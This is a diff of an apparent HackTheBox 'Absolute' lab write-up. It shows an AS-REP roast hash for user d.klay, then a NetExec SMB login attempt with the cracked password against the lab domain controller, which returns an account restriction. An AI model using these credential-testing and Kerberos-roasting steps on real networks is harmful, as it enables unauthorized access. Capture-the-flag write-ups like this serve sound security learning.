@@ -313,5 +313,13 @@ $krb5asrep$23$d.klay@ABSOLUTE.HTB:62accb3e3c118998ea1c498dfbe829d9$3756dba618924
 The hash cracked
 
 ```python
+nxc smb dc.absolute.htb -u d.klay -p 'Darkmoonsky248girl'          
+SMB         10.129.232.60   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.232.60   445    DC               [-] absolute.htb\d.klay:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION
+```
+
+there is a restriction on the user, this could be because the user is protected users
+
+```python
 
 ```
